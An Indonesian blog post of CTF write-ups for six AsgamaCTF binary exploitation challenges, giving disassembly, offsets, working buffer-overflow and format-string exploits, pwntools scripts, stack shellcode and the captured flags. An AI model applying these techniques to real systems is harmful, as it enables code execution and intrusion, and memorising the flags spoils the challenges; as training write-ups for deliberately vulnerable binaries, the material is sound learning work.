---
layout: post
title: "AsgamaCTF Binary Exploit Write-Up"
date: 2020-07-15 06:25:05 +0530
categories:
  - WriteUp
  - PWN
---


AsgamaCTF adalah platform yang disediakan oleh Universitas Gajah Maja untuk bahan pembelajaran yang ditargetkan untuk umum. Adapun berikut jenis-jenis soal yang disediakan, sebagai berikut:

- Web Exploitation
- Forensic
- Cryptography
- Binary Exploitation
- Dan Lain-Lain.

Berikut write-up beberapa challenge kategori Binary Exploitation. 

## Buffer1 [50 pts]

Diberikan file [buf1](https://github.com/abdullahnz/Writeup/blob/master/AsgamaCTF/buf2) ELF 32-bit not stripped dan service ```nc asgama.web.id 40203```.

```bash
$ file buf1 
buf1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66a2a0cfb02b03a6abf1e65146da2739e8b17bdd, not stripped
```
Dan berikut hasil disassembly fungsi ```main``` yang ada pada program yang diberikan.

```py
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x08048537 <+0>:  lea    ecx,[esp+0x4]
   0x0804853b <+4>:  and    esp,0xfffffff0
   0x0804853e <+7>:  push   DWORD PTR [ecx-0x4]
   0x08048541 <+10>: push   ebp
   0x08048542 <+11>: mov    ebp,esp
   0x08048544 <+13>: push   ecx
   0x08048545 <+14>: sub    esp,0x94
   0x0804854b <+20>: call   0x8048506 <init>
   0x08048550 <+25>: mov    DWORD PTR [ebp-0xc],0x0
   0x08048557 <+32>: sub    esp,0xc
   0x0804855a <+35>: lea    eax,[ebp-0x8c]
   0x08048560 <+41>: push   eax
   0x08048561 <+42>: call   0x8048390 <gets@plt>
   0x08048566 <+47>: add    esp,0x10
   0x08048569 <+50>: cmp    DWORD PTR [ebp-0xc],0x13377331
   0x08048570 <+57>: jne    0x8048584 <main+77>
   0x08048572 <+59>: sub    esp,0xc
   0x08048575 <+62>: push   0x8048630
   0x0804857a <+67>: call   0x80483b0 <system@plt>
   0x0804857f <+72>: add    esp,0x10
   0x08048582 <+75>: jmp    0x8048594 <main+93>
   0x08048584 <+77>: sub    esp,0xc
   0x08048587 <+80>: push   0x804863b
   0x0804858c <+85>: call   0x80483a0 <puts@plt>
   0x08048591 <+90>: add    esp,0x10
   0x08048594 <+93>: mov    eax,0x0
   0x08048599 <+98>: mov    ecx,DWORD PTR [ebp-0x4]
   0x0804859c <+101>:   leave  
   0x0804859d <+102>:   lea    esp,[ecx-0x4]
   0x080485a0 <+105>:   ret    
End of assembler dump.
```

Program ini menggunakan ```gets``` untuk mengambil inputan kita yang diberi ukuran sebesar ```0x8c```.

Tujuan kita disini adalah memanggil fungsi ```system``` yang ada pada alamat ```0x0804857a```. Untuk mencapai ```system```, ada hal yang perlu dipenuhi dahulu.

```py
0x08048569 <+50>: cmp    DWORD PTR [ebp-0xc],0x13377331
0x08048570 <+57>: jne    0x8048584 <main+77>
```

Berikut penjelasan potongan disassembly diatas.
- ```cmp``` diatas berarti apakah value pada ```ebp-0xc``` adalah ```0x13377331```. Jika tidak, paka program akan loncat ke alamat ```0x8048584```.
> The CMP instruction compares two operands. It is generally used in conditional execution. This instruction basically subtracts one operand from the other for comparing whether the operands are equal or not. It does not disturb the destination or source operands. It is used along with the conditional jump instruction for decision making.
- Singkatnya, ```cmp``` mempunyai syntax sebagai berikut.
```r
    CMP [destination], [source]
```

### Exploit
Inputan kita berada pada ```ebp-0x8c```. Untuk sampai di ```ebc-0xc``` kita membutuhkan,
- Padding berukuran ```0x8c - 0xc = 0x80 (128 dalam desimal)```
- Ditambah dengan ```0x13377331``` dalam [little endian](https://en.wikipedia.org/wiki/Endianness).

```sh
$ python -c 'print "A"*128 + "\x31\x73\x37\x13"' | nc asgama.web.id 40203
GamaCTF{BufF3rR__0vErf10W__EZ}
```
### Flag
`GamaCTF{BufF3rR__0vErf10W__EZ}`  
 

## Buffer2 [75 pts]

Diberikan File [buf2](https://github.com/abdullahnz/Writeup/blob/master/AsgamaCTF/buf2) ELF 32-bit not stripped dan service ```nc asgama.web.id 40202```

```bash
$ file buf2 
buf2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=422a2c2391911b03f182ed6a8a2b65ca200f276c, not stripped
```
Dan berikut hasil disassembly fungsi ```main``` yang ada pada program yang diberikan.
 
```bash
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x0804855d <+0>:	lea    ecx,[esp+0x4]
   0x08048561 <+4>:	and    esp,0xfffffff0
   0x08048564 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048567 <+10>:	push   ebp
   0x08048568 <+11>:	mov    ebp,esp
   0x0804856a <+13>:	push   ecx
   0x0804856b <+14>:	sub    esp,0x4
   0x0804856e <+17>:	call   0x8048545 <hah>
   0x08048573 <+22>:	sub    esp,0xc
   0x08048576 <+25>:	push   0x8048623
   0x0804857b <+30>:	call   0x80483a0 <puts@plt>
   0x08048580 <+35>:	add    esp,0x10
   0x08048583 <+38>:	mov    eax,0x0
   0x08048588 <+43>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x0804858b <+46>:	leave  
   0x0804858c <+47>:	lea    esp,[ecx-0x4]
   0x0804858f <+50>:	ret    
End of assembler dump. 
```
Terlihat pada alamat ```0x0804856e``` fungsi ```main``` memanggil fungsi ```hah``` yang mempunyai vulnerable *buffer overflow* karena menggunakan ```gets``` untuk mengambil inputan kita seperti soal sebelumnya.
 
```bash
gdb-peda$ pdisas hah
Dump of assembler code for function hah:
   0x08048545 <+0>:	push   ebp
   0x08048546 <+1>:	mov    ebp,esp
   0x08048548 <+3>:	sub    esp,0x48
   0x0804854b <+6>:	sub    esp,0xc
   0x0804854e <+9>:	lea    eax,[ebp-0x48]
   0x08048551 <+12>:	push   eax
   0x08048552 <+13>:	call   0x8048390 <gets@plt>
   0x08048557 <+18>:	add    esp,0x10
   0x0804855a <+21>:	nop
   0x0804855b <+22>:	leave  
   0x0804855c <+23>:	ret    
End of assembler dump.
```
### Exploit
Program memiliki bug *buffer overflow* dan kita bisa mengontrol flow jalannya program. Tapi kemana kita arahkan jalur lajunya program ?

Perlu diketahui, ternyata program mempunyai fungsi lain yang beralamat ```0x0804851c``` bernama ```debug```

```py
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x08048390  gets@plt
0x080483a0  puts@plt
0x080483b0  system@plt
0x080483c0  __libc_start_main@plt
0x080483d0  setvbuf@plt
0x080483e0  __gmon_start__@plt
0x080483f0  _start
0x08048420  __x86.get_pc_thunk.bx
0x08048430  deregister_tm_clones
0x08048460  register_tm_clones
0x080484a0  __do_global_dtors_aux
0x080484c0  frame_dummy
0x080484eb  init
0x0804851c  debug
0x08048545  hah
0x0804855d  main
0x08048590  __libc_csu_init
0x080485f0  __libc_csu_fini
0x080485f4  _fini
gdb-peda$ 
```

Didalam fungsi ini, kita akan mendapatkan shell, berikut hasil disassemble-nya.

```py
gdb-peda$ pdisas debug
Dump of assembler code for function debug:
   0x0804851c <+0>:	push   ebp
   0x0804851d <+1>:	mov    ebp,esp
   0x0804851f <+3>:	sub    esp,0x8
   0x08048522 <+6>:	sub    esp,0xc
   0x08048525 <+9>:	push   0x8048610
   0x0804852a <+14>:	call   0x80483a0 <puts@plt>
   0x0804852f <+19>:	add    esp,0x10
   0x08048532 <+22>:	sub    esp,0xc
   0x08048535 <+25>:	push   0x804861b
   0x0804853a <+30>:	call   0x80483b0 <system@plt>
   0x0804853f <+35>:	add    esp,0x10
   0x08048542 <+38>:	nop
   0x08048543 <+39>:	leave  
   0x08048544 <+40>:	ret    
End of assembler dump.
gdb-peda$ x/s 0x804861b
0x804861b:	"/bin/sh"
```

Inputan kita berada pada ```ebp-0x48```. Untuk sampai ke *return address*, kita harus meng-overwrite ```ebp```
- Karena soal ini merupakan file 32 bit, maka harus menambahkan 4 byte padding untuk meng-overwrite ```ebp``` sehingga sampai ke *return address*. 
- Panjang 1 register 32bit adalah 4 byte. Sedangkan dalam 64bit, 1 register memiliki panjang 8 byte.
- *Return address*, yaitu pada alamat fungsi ```debug``` yang akan mengeksekusi shell.

```python
from pwn import *

r = remote("asgama.web.id", 40202)
offset  = 72 + 4
debug   = p32(0x0804851c)
payload = "A" * offset + debug

r.send(payload)
r.interactive()
```
Jalankan dan didapatkan shell.
```sh
$ python solver.py 
[+] Opening connection to asgama.web.id on port 40202: Done
[*] Switching to interactive mode
$ 
$ ls
buf2
flag
$ cat flag
GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}
$
[*] Closed connection to asgama.web.id port 40202
```
### Flag
`GamaCTF{C0ntR0l_Fl0w_H1J4ckiNg}`    

## EZ 1 [100 pts]

Diberikan file ELF 32-bit [hoho](https://github.com/abdullahnz/Writeup/blob/master/AsgamaCTF/hoho) not stripped dan service ```asgama.web.id:40210```
```sh
$ file hoho
hoho: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=91cf29963d62f9f85d561bb273ed4d7a54b5037b, not stripped
```

Berikut hasil dissasembly fungsi ```main``` yang ada dalam program.

```py
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x0804851c <+0>:  lea    ecx,[esp+0x4]
   0x08048520 <+4>:  and    esp,0xfffffff0
   0x08048523 <+7>:  push   DWORD PTR [ecx-0x4]
   0x08048526 <+10>: push   ebp
   0x08048527 <+11>: mov    ebp,esp
   0x08048529 <+13>: push   ecx
   0x0804852a <+14>: sub    esp,0x94
   0x08048530 <+20>: call   0x80484eb <init>
   0x08048535 <+25>: mov    DWORD PTR [ebp-0xc],0x0
   0x0804853c <+32>: mov    DWORD PTR [ebp-0x10],0x64
   0x08048543 <+39>: sub    esp,0xc
   0x08048546 <+42>: lea    eax,[ebp-0x90]
   0x0804854c <+48>: push   eax
   0x0804854d <+49>: call   0x8048390 <gets@plt>
   0x08048552 <+54>: add    esp,0x10
   0x08048555 <+57>: cmp    DWORD PTR [ebp-0xc],0x13377331
   0x0804855c <+64>: jne    0x8048576 <main+90>
   0x0804855e <+66>: cmp    DWORD PTR [ebp-0x10],0x0
   0x08048562 <+70>: jne    0x8048576 <main+90>
   0x08048564 <+72>: sub    esp,0xc
   0x08048567 <+75>: push   0x8048620
   0x0804856c <+80>: call   0x80483b0 <system@plt>
   0x08048571 <+85>: add    esp,0x10
   0x08048574 <+88>: jmp    0x8048586 <main+106>
   0x08048576 <+90>: sub    esp,0xc
   0x08048579 <+93>: push   0x804862b
   0x0804857e <+98>: call   0x80483a0 <puts@plt>
   0x08048583 <+103>:   add    esp,0x10
   0x08048586 <+106>:   mov    eax,0x0
   0x0804858b <+111>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x0804858e <+114>:   leave  
   0x0804858f <+115>:   lea    esp,[ecx-0x4]
   0x08048592 <+118>:   ret    
End of assembler dump.
```

Sama dengan soal ```buffer1```, binary ini menggunakan ```gets``` untuk mengambil inputan yang diberi ukuran sebesar ```0x90```.

```py
 0x08048555 <+57>: cmp    DWORD PTR [ebp-0xc],0x13377331
 0x0804855c <+64>: jne    0x8048576 <main+90>
 0x0804855e <+66>: cmp    DWORD PTR [ebp-0x10],0x0
 0x08048562 <+70>: jne    0x8048576 <main+90>
```

Tetapi, dalam binary ini, ada 2 validasi yang harus dilalui.
1. `ebp-0xc` harus bernilai `0x13377331`
2. `ebp-0x10` harus bernilai `0x0`

### Exploit

Sama seperti soal [Buffer 1](http://127.0.0.1:4000/write-ups/asgama-ctf-pwn-writeup/#buffer1-50-pts), hanya ada beberapa yang perlu dikalkulasi ulang.
- Padding disini diganti dengan `0x0`.
- Panjang padding `0x90 - 0xc = 0x84 (132 dalam desimal)`


```sh
$ python -c 'print "\x00"*132 + "\x31\x73\x37\x13"' | nc asgama.web.id 40210
GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}
```
### Flag
`GamaCTF{0v3RWrite_vAriaBl3_D0eL0e_G4n}`  



## EZ 2 [150 pts]

Diberikan file ELF-32 bit [hehe](https://github.com/abdullahnz/Writeup/blob/master/AsgamaCTF/hehe) not stripped dan service  ```asgama.web.id:40209```
```sh
$ file hehe
hehe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=91febecb162e2e4c737a82cd97f7f38040c28e55, not stripped
```

Dalam fungsi `main` hanya memanggil fungsi `hah` dan berikut hasil disassemble fungsi `hah` pada binary.

```py
gdb-peda$ pdisas hah
Dump of assembler code for function hah:
   0x0804854e <+0>:  push   ebp
   0x0804854f <+1>:  mov    ebp,esp
   0x08048551 <+3>:  sub    esp,0x48
   0x08048554 <+6>:  sub    esp,0xc
   0x08048557 <+9>:  lea    eax,[ebp-0x48]
   0x0804855a <+12>: push   eax
   0x0804855b <+13>: call   0x8048390 <gets@plt>
   0x08048560 <+18>: add    esp,0x10
   0x08048563 <+21>: nop
   0x08048564 <+22>: leave  
   0x08048565 <+23>: ret    
End of assembler dump.
```

Fungsi `hah` menggunakan fungsi `gets` yang mempunyai bug `buffer overflow` untuk mengambil inputan dan memiliki panjang `0x48`.

Dalam binary juga terdapat fungsi `debug` yang memanggil shell jika semua validasi terpenuhi.

```py
gdb-peda$ pdisas debug
Dump of assembler code for function debug:
   0x0804851c <+0>:  push   ebp
   0x0804851d <+1>:  mov    ebp,esp
   0x0804851f <+3>:  sub    esp,0x8
   0x08048522 <+6>:  cmp    DWORD PTR [ebp+0x8],0xaabbccdd
   0x08048529 <+13>: jne    0x804854b <debug+47>
   0x0804852b <+15>: sub    esp,0xc
   0x0804852e <+18>: push   0x8048620
   0x08048533 <+23>: call   0x80483a0 <puts@plt>
   0x08048538 <+28>: add    esp,0x10
   0x0804853b <+31>: sub    esp,0xc
   0x0804853e <+34>: push   0x804862b
   0x08048543 <+39>: call   0x80483b0 <system@plt>
   0x08048548 <+44>: add    esp,0x10
   0x0804854b <+47>: nop
   0x0804854c <+48>: leave  
   0x0804854d <+49>: ret    
End of assembler dump.
```

### Exploit

1. Padding sebesar `0x48 + 4 byte` untuk meng-overwrite register `ebp` untuk sampai ke *return addess*.
2. Alamat fungsi `debug`.
3. Argument untuk fungsi `debug` yaitu `0xaabbccdd`.
4. Junk 4 byte sebelum argument `debug`, berikut layout stack.
 
| Register |  Value |
|:---------------------------:|:---------------------------:|
|  `ebp-0x48`  |  `0x41414141`  |
|   `. . .`    |  `0x41414141`  |
|  `ebp-0x4`   |  `0x41414141`  |
|    `ebp`     |  `0x0804851c`  |
|  `ebp+0x4`   |  `????`  |
|  `ebp+0x8`   |  `0xaabbccdd`  |
 
Berikut solver yang dibuat.

```python
from pwn import *

r = remote("asgama.web.id", 40209)

offset    = 72 + 4 
debug     = p32(0x0804851c) 
debug_arg = p32(0xaabbccdd) 

payload  = "A"*offset
payload += debug  
payload += "JUNK"
payload += debug_arg

r.sendline(payload)
r.interactive()
```

Jalankan dan didapatkan shell.
```sh
$ python solver.py 
[+] Opening connection to asgama.web.id on port 40209: Done
[*] Switching to interactive mode
Debug Mode
$ ls
flag
hehe
$ cat flag
GamaCTF{R0P_r0P_FTW}
$ 
[*] Interrupted
[*] Closed connection to asgama.web.id port 40209
```
### Flag
`GamaCTF{R0P_r0P_FTW}`   

## Buffow [200 pts]

Diberikan file ELF 32-bit [buffow](https://github.com/abdullahnz/Writeup/blob/master/AsgamaCTF/buffow) not stripped yang hanya meminta inputan tapi tidak mencetak output; dan service ```asgama.web.id:40211```
```sh
$ file buffow
buffow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=10ddb3cec335906e1fc641fce780bffc73fcb09a, not stripped
```

Dalam binary ini mempunyai banyak fungsi, tetapi yang paling penting adalah fungsi ```main``` dan ```flag```.
Saya coba membuat inputan dengan ```pattern``` yang ada di gdb.

```py
gdb-peda$ pattern create 300 exp
Writing pattern of 300 chars to filename "exp"
gdb-peda$ b *0x08049290
Breakpoint 2 at 0x8049290
gdb-peda$ r < exp 
Starting program: /home/abdullahnz/AsgamaCTF/WriteUp/buffow < exp
...
Stopped reason: SIGSEGV
0x41474141 in ?? ()
gdb-peda$ pattern offset 0x41474141
1095188801 found at offset: 52
```

Terlihat pada offset 52 ```eip``` ter-overwrite dan bisa merubah *return address* mengarah ke fungsi `flag` yang ada pada alamat `0x080491c2`.

```sh
$ objdump -D ./buffow | grep flag
080491c2 <flag>:
```

### Exploit

1. Panjang padding yaitu 52 untuk sampai ke *return address*.
2. Tambah alamat fungsi `flag` yaitu `0x080491c2`.
3. Susun payload.

```bash
$ python -c 'print "A"*52 + "\xc2\x91\x04\x08"' | ./buffow

$ Hmm
```

Program tidak ada output. Debug menggunakan `gdb` lihat apa yang sebenarnya terjadi pada program.

```sh
$ python -c 'print "A"*52 + "\xc2\x91\x04\x08"' > exp
$ gdb -q ./buffow
Reading symbols from ./buffow...(no debugging symbols found)...done.
gdb-peda$ r < exp 
Starting program: /home/abdullahnz/CTF/AsgamaCTF/PWN/buffow < exp
[Inferior 1 (process 19910) exited normally]
Warning: not running or target is remote
```

Ternyata program tidak mengalami *crash*. Coba tambah padding lagi dengan 200 karakter. Dan `flag` didapat.


```bash
$ python -c 'print "A"*52 + "\xc2\x91\x04\x08" + "B"*200 ' | ./buffow 
GamaCTF{th3_re4l_fl4g_0n_th3_s3rv3r:))}

$ python -c 'print "A"*52 + "\xc2\x91\x04\x08" + "B"*200' | nc asgama.web.id 40211
GamaCTF{Ini_Bukan_Flagnya}
```

### Flag
`GamaCTF{Ini_Bukan_Flagnya}`.

## Bebas

Diberikan file `bebas.zip` yang didalamnya terdapat file binary elf 32bit yang executable.
```sh
$ file soal 
soal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=1e0fd5399de0053521ffb91126a380a5ccfa1255, not stripped
```

Binary ini membutuhkan 2 inputan client, yaitu nama dan alamat yang dimana keduanya memiliki bug `format string` dan `buffer overflow` karena inputan menggunakan fungsi `gets`.

```py
$ ./soal 
Selamat Datang di Co-Jek
Masukan Nama Anda:
>> %p|%p|%p
Hai 0x8048803|0xffa27e8a|0x80486a8!
Masukan alamat : 
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Pesanan akan segera diantar!
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```

Tetapi buffer overflow disini dapat dilakukan harus dengan me-leak value dari canary dulu, karena canary dalam binary ini hidup.

```sh
abdullahnz@zeroday ~/CTF/AsgamaCTF/PWN/bebas checksec ./soal
[*] '/home/abdullahnz/CTF/AsgamaCTF/PWN/bebas/soal'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Ada 2 cara untuk mengeksploit binary ini, yaitu:
   1. Ret2libc.
   2. Write shellcode pada stack.

### Exploit
Berikut flow exploit dan pembuatan payload yang dilakukan.
   1. Leak canary dengan memanfaatkan bug `format string` pada input pertama.
   2. Leak address stack pada inputan kedua juga dengan memanfaatkan bug `format string` pada input pertama.
   3. Padding sebesar 0x136 ditambah dengan nilai canary.
   4. Return address ke alamat shellcode dimulai.
   5. Shellcode.

```py
   ...
   0x804866e <main+38>: mov    DWORD PTR [ebp-0xc],eax
=> 0x8048671 <main+41>: xor    eax,eax
   0x8048673 <main+43>: call   0x80485e6 <init>
   ...

  0x08048671 in main ()
  gdb-peda$ i r $eax
  eax            0x406e700        0x406e700
```

Canary memiliki nullbyte. Cari value canary dengan brute offset canary dan cari yang memiliki nullbyte diakhir dan debug binary untuk memastikan itu adalah nilai canary.

```sh
$ python brute.py | grep 00!
63 0xf7fb1000!
67 0xf9dd3600!
72 0xf7ef2000!
73 0xf7f80000!
```

File `brute.py`:
```py
#!/usr/bin/python

from pwn import *

context.log_level = 'warn'

def exploit():
    for i in range(80):
        p = process('./soal')
        payload = "%{}$p".format(i)
        p.sendlineafter(">> ", payload)
        p.recvuntil("Hai ")
        print i, p.recvline()
if __name__ == '__main__':
    exploit()
```

Ada beberapa output yang memiliki nullbyte diakhir, coba debug binary leak pada offset 63.

```py
  Legend: code, data, rodata, value
  0x08048671 in main ()
  gdb-peda$ i r $eax
  eax            0xb376ff00       0xb376ff00
```
Canary adalah 0xb376ff00, continue dengan command `c` dan masukkan nama "%63$p".
```py
  gdb-peda$ c
  Continuing.
  Selamat Datang di Co-Jek
  Masukan Nama Anda:
  >> %63$p
  Hai 0xf7ffd000!
  ...
```
Hmm, ternyata offset 63 bukan merupakan canary. Lakukan pada offset berikutnya tadi dengan cara seperti diatas, dan ditemukan canary pada offset ke-67.

```py
  0x08048671 in main ()
  gdb-peda$ i r $eax
  eax            0xb1b3b000       0xb1b3b000
  gdb-peda$ c
  Continuing.
  Selamat Datang di Co-Jek
  Masukan Nama Anda:
  >> %67$p
  Hai 0xb1b3b000!
  Masukan alamat : 
  ```

Selajutnya adalah mencari address stack. Dari semua offset, saya menggunakan offset 2.

```py
  0x080486cc in main ()                                                                     
  gdb-peda$ ni                                                                
  Hai 0xd1ea3200||0xffffcd1a! 
     ...
     0x80486f0 <main+168>:        call   0x8048460 <gets@plt>
  => 0x80486f5 <main+173>:        add    esp,0x10
     0x80486f8 <main+176>:        sub    esp,0xc
     ...
  [------------------------------------stack-------------------------------------]
  0000| 0xffffcca0 --> 0xffffccb6 ("AAAABBBBCCCC")
  ...
  gdb-peda$ p 0xffffcd1a-0xffffccb6
  $1 = 0x64
```

Alamat yang bocor pada offset 2 adalah `0xffffcd1a`, sementara alamat stack adalah `0xffffccb6`. Selisih/jarak alamat pada offset 2 dan alamat stack adalah `0x64`. Maka untuk mendapatkan alamat stack, leak pada offset 2 lalu kurangi `0x64`.

![Output](https://abdullahnz.github.io/assets/images/asgama_5.png)

Selanjutnya dilakukan pembuatan payload. Flow paylaod: `padding + canary + return address ke alamat stack 2 kali + shellcode`.

```py 
   payload = b''.join([    
      "A"*(0x136),
      p32(canary),
      p32(stack_address+0x136+12),
      p32(stack_address+0x136+12),
      asm(shellcraft.sh())
   ])
```

Run exploit dan didapatkan shell.

![Shell](https://abdullahnz.github.io/assets/images/asgama_5s.png)

Solver bisa dilihat [disini](https://github.com/abdullahnz/abdullahnz.github.io/blob/master/_posts/solver/solver_soal.py).

## Notes
Sebagian solver diatas dibuat dengan bantuan dari pwntools yang bisa didownload [disini](https://github.com/Gallopsled/pwntools).

## Referensi
1. *https://www.tutorialspoint.com/assembl.. [(klik)](https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm)*
2. *https://en.wikipedia.org/wiki/Endianness [(klik)](https://en.wikipedia.org/wiki/Endianness)*
